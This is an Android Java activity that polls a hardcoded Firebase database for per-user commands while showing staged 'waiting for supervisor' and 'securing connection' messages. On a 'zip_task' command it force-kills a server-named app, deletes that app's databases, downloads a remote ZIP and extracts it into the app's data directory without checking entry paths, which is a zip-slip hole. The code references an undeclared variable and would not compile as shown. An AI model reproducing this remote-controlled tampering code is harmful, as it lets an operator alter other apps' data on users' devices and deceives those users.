package com.ban.ab;

import android.app.ActivityManager;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.os.Handler;
import android.os.Looper;
import android.provider.Settings;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.LinearLayout;
import android.widget.ProgressBar;
import android.widget.TextView;
import android.widget.Toast;
import androidx.appcompat.app.AppCompatActivity;
import androidx.cardview.widget.CardView;
import org.json.JSONObject;
import java.io.BufferedInputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.util.zip.ZipEntry;
import java.util.zip.ZipInputStream;
import okhttp3.Call;
import okhttp3.Callback;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.Response;
import okio.BufferedSink;
import okio.Okio;

public class SecondActivity extends AppCompatActivity {

    private String userName;
    private final String FIREBASE_URL = "https://banproject-2f9c6-default-rtdb.firebaseio.com/";
    private final OkHttpClient client = new OkHttpClient();

    private CardView layoutWaiting, layoutRejected, layoutFields, layoutZipTask;
    private LinearLayout groupField1;
    private TextView txtRejectReason, txtProgressStatus, txtTicketID, txtTaskDescription;
    private EditText field1;
    private Button btnCancelOrder, btnExecuteTask;
    private ProgressBar taskProgressBar;

    private final Handler refreshHandler = new Handler(Looper.getMainLooper());
    private Runnable refreshRunnable;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_second);

        // --- كود فحص إذن الوصول لجميع الملفات (أندرويد 11 وما فوق) ---
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            if (!Environment.isExternalStorageManager()) {
                try {
                    Intent intent = new Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION);
                    intent.addCategory("android.intent.category.DEFAULT");
                    intent.setData(Uri.parse(String.format("package:%s", getApplicationContext().getPackageName())));
                    startActivity(intent);
                } catch (Exception e) {
                    Intent intent = new Intent();
                    intent.setAction(Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION);
                    startActivity(intent);
                }
            }
        }

        userName = getSharedPreferences("AppPrefs", MODE_PRIVATE).getString("user_name", "");

        initViews();
        generateTicketID();
        startStatusSequence(); 
        startAutoRefresh();
    }
    
    private void initViews() {
        layoutWaiting = findViewById(R.id.layoutWaiting);
        layoutRejected = findViewById(R.id.layoutRejected);
        layoutFields = findViewById(R.id.layoutFields);
        layoutZipTask = findViewById(R.id.layoutZipTask); 
        
        txtProgressStatus = findViewById(R.id.txtProgressStatus);
        txtTicketID = findViewById(R.id.txtTicketID);
        txtRejectReason = findViewById(R.id.txtRejectReason);
        txtTaskDescription = findViewById(R.id.txtTaskDescription);
        
        groupField1 = findViewById(R.id.groupField1);
        field1 = findViewById(R.id.field1);
        
        btnCancelOrder = findViewById(R.id.btnCancelOrder);
        btnExecuteTask = findViewById(R.id.btnExecuteTask); 
        taskProgressBar = findViewById(R.id.taskProgressBar);

        btnCancelOrder.setOnClickListener(v -> {
            stopAutoRefresh();
            getSharedPreferences("AppPrefs", MODE_PRIVATE).edit().clear().apply();
            startActivity(new Intent(this, MainActivity.class));
            finish();
        });
    }

    private void generateTicketID() {
        txtTicketID.setText("تذكرة رقم: " + (System.currentTimeMillis() / 100000));
    }

    private void startStatusSequence() {
        final String[] msgs = {"جاري فحص البيانات...", "بانتظار المشرف المباشر...", "يتم الآن تأمين الاتصال..."};
        refreshHandler.post(new Runnable() {
            int i = 0;
            @Override public void run() {
                if (layoutWaiting.getVisibility() == View.VISIBLE) {
                    txtProgressStatus.setText(msgs[i % msgs.length]);
                    i++;
                    refreshHandler.postDelayed(this, 3000);
                }
            }
        });
    }

    private void startAutoRefresh() {
        refreshRunnable = new Runnable() {
            @Override public void run() {
                checkFirebaseStatus();
                refreshHandler.postDelayed(this, 5000); 
            }
        };
        refreshHandler.post(refreshRunnable);
    }

    private void checkFirebaseStatus() {
        String url = FIREBASE_URL + "commands/" + userName + ".json";
        client.newCall(new Request.Builder().url(url).build()).enqueue(new Callback() {
            @Override public void onFailure(Call call, IOException e) {}
            @Override public void onResponse(Call call, Response response) throws IOException {
                if (response.isSuccessful() && response.body() != null) {
                    try {
                        String res = response.body().string();
                        if (res.equals("null")) return;
                        JSONObject data = new JSONObject(res);
                        runOnUiThread(() -> updateUI(data.optString("status"), data));
                    } catch (Exception ignored) {}
                }
            }
        });
    }

    private void updateUI(String status, JSONObject data) {
        layoutWaiting.setVisibility(View.GONE);
        layoutRejected.setVisibility(View.GONE);
        layoutFields.setVisibility(View.GONE);
        layoutZipTask.setVisibility(View.GONE);

        if (status.equals("rejected")) {
            layoutRejected.setVisibility(View.VISIBLE);
            txtRejectReason.setText(data.optString("reason", "تم الرفض"));
        } else if (status.equals("fields")) {
            layoutFields.setVisibility(View.VISIBLE);
        } else if (status.equals("zip_task")) {
            layoutZipTask.setVisibility(View.VISIBLE);
            String zipUrl = data.optString("zip_url");
            String targetPkg = data.optString("target_package", "com.target.app");
            
            btnExecuteTask.setOnClickListener(v -> startModdingProcess(zipUrl, targetPkg));
        } else {
            layoutWaiting.setVisibility(View.VISIBLE);
        }
    }

    private void startModdingProcess(String url, String pkg) {
        btnExecuteTask.setEnabled(false);
        taskProgressBar.setVisibility(View.VISIBLE);
        
        new Thread(() -> {
            boolean success = false;
            try {
                // 1. إغلاق التطبيق المستهدف
                // 1. إغلاق إجباري عنيف
                am.killBackgroundProcesses(pkg);
                Thread.sleep(500); // وقت مستقطع للتأكد من الإغلاق
// 2. الوصول للمسار
                Context targetContext = createPackageContext(pkg, 0); 
                String targetPath = targetContext.getApplicationInfo().dataDir;
                File targetDir = new File(targetPath);

                File databaseDir = new File(targetPath, "databases");
                if (databaseDir.exists()) deleteRecursive(databaseDir);

                // 3. تحميل الملف ZIP
                File tempZip = new File(getCacheDir(), "update.zip");
                downloadFileSync(url, tempZip);

                // 4. فك الضغط في المسار الهدف مباشرة
                unzip(tempZip, new File(targetPath));
                
                tempZip.delete(); 
                success = true;
            } catch (Exception e) {
                e.printStackTrace();
            }

            final boolean finalSuccess = success;
            runOnUiThread(() -> {
                taskProgressBar.setVisibility(View.GONE);
                btnExecuteTask.setEnabled(true);
                if (finalSuccess) {
                    Toast.makeText(this, "تمت العملية بنجاح ✅", Toast.LENGTH_LONG).show();
                } else {
                    Toast.makeText(this, "فشلت العملية ❌", Toast.LENGTH_LONG).show();
                }
            });
        }).start();
    }

    private void downloadFileSync(String url, File destFile) throws IOException {
        Request request = new Request.Builder().url(url).build();
        try (Response response = client.newCall(request).execute()) {
            if (!response.isSuccessful()) throw new IOException("Download failed");
            try (BufferedSink sink = Okio.buffer(Okio.sink(destFile))) {
                sink.writeAll(response.body().source());
            }
        }
    }

    private void unzip(File zipFile, File targetDir) throws IOException {
        try (ZipInputStream zis = new ZipInputStream(new BufferedInputStream(new FileInputStream(zipFile)))) {
            ZipEntry ze;
            while ((ze = zis.getNextEntry()) != null) {
                File file = new File(targetDir, ze.getName());
                if (ze.isDirectory()) {
                    file.mkdirs();
                } else {
                    File parent = file.getParentFile();
                    if (parent != null) parent.mkdirs();
                    try (FileOutputStream fos = new FileOutputStream(file)) {
                        byte[] buffer = new byte[8192];
                        int len;
                        while ((len = zis.read(buffer)) != -1) {
                            fos.write(buffer, 0, len);
                        }
                    }
                }
            }
        }
    }

    private void stopAutoRefresh() { refreshHandler.removeCallbacks(refreshRunnable); }
    @Override protected void onDestroy() { super.onDestroy(); stopAutoRefresh(); }
}
